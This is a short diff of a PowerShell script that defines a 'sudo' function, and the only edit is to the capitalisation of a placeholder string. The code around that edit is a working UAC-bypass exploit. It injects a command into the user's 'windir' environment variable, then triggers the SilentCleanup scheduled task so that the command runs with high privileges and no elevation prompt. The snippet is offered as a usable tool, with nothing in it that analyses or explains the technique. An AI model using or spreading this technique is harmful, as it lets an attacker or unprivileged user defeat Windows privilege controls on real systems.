@@ -1,6 +1,6 @@
 function sudo {
 
-    $command = "Desired Command to Run with high privs " + $args + ";#";
+    $command = "Desired command to run with high privs " + $args + ";#";
 	
     Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $command ;
     schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I;
